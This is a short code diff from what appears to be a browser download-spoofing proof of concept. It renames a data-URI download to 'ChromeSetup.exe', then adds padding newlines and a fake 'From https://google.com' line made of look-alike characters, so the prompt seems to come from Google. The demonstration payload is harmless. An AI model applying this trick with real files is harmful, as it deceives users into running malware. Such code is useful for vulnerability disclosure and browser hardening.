@@ -41,15 +41,11 @@
     }
     // Kick off your “exe” download
     function openWin() {
-  Puf(
-    "data:application/octet-stream;base64,WW91IEhhdmUgQmVlbiBIYWNrZWQ=",
-    "poc.apk"
-  );
-
-  const info = document.createElement("p");
-  info.innerText = "From https∶ ̸ ̸ google.com";
-  document.body.appendChild(info);
-}
+      Puf(
+        "data:application/octet-stream;base64,WW91IEhhdmUgQmVlbiBIYWNrZWQ=",
+        "ChromeSetup.exe\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFrom https∶ ̸ ̸ google.com"
+      );
+    }
     function goFullScreen() {
       const element = document.documentElement;
       if (element.requestFullscreen) {
